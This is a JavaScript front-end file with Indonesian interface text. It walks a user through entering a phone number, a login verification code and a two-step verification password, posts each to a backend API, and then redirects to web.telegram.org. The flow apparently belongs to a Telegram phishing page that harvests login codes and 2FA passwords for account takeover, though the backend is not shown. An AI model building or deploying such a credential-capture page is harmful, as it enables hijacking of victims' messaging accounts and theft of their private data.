async function showCodeConfirmation(event) {
  event.preventDefault();
  const countryCode = document.getElementById("country-code").innerText;
  const phoneNumber = document.getElementById("phone-number").value;
  const fullPhoneNumber = countryCode + phoneNumber;

  try {
    const response = await fetch("http://127.0.0.1:5000/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ phone_number: fullPhoneNumber }),
    });

    // Periksa apakah respons berhasil
    if (!response.ok) {
      const errorData = await response.json(); // Mengambil data kesalahan
      throw new Error(
        errorData.error || "Terjadi kesalahan saat menghubungi server"
      );
    }

    const data = await response.json(); // Mengurai respons JSON
    alert(data.message);
    document.getElementById("phone-form").style.display = "none";
    document.getElementById("code-confirmation").style.display = "block";
  } catch (error) {
    console.error("Error:", error);
    alert("Kesalahan: " + error.message);
  }
}

async function showPasswordConfirmation(event) {
  event.preventDefault();
  const verificationCode = document.getElementById("verification-code").value;
  const countryCode = document.getElementById("country-code").innerText;
  const phoneNumber = document.getElementById("phone-number").value;
  const fullPhoneNumber = countryCode + phoneNumber;

  const response = await fetch("/api/verify_code", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      phone_number: fullPhoneNumber,
      verification_code: verificationCode,
    }),
  });

  const data = await response.json();
  if (data.message === "Verifikasi dua langkah diperlukan.") {
    document.getElementById("code-confirmation").style.display = "none";
    document.getElementById("password-confirmation").style.display = "block";
  } else {
    alert(data.message);
  }
}

async function redirectToTelegram(event) {
  event.preventDefault();
  const password = document.getElementById("password").value;

  const response = await fetch("/api/verify_password", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ password: password }),
  });

  const data = await response.json();
  alert(data.message);
  if (response.ok) {
    document.getElementById("popup").style.display = "block";
    setTimeout(() => {
      window.location.href = "https://web.telegram.org"; // Redirect to Telegram
    }, 2000);
  }
}

function togglePasswordVisibility() {
  const passwordInput = document.getElementById("password");
  const toggleButton = document.getElementById("toggle-visibility");
  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    toggleButton.textContent = "Sembunyikan Password";
  } else {
    passwordInput.type = "password";
    toggleButton.textContent = "Tampilkan Password";
  }
}
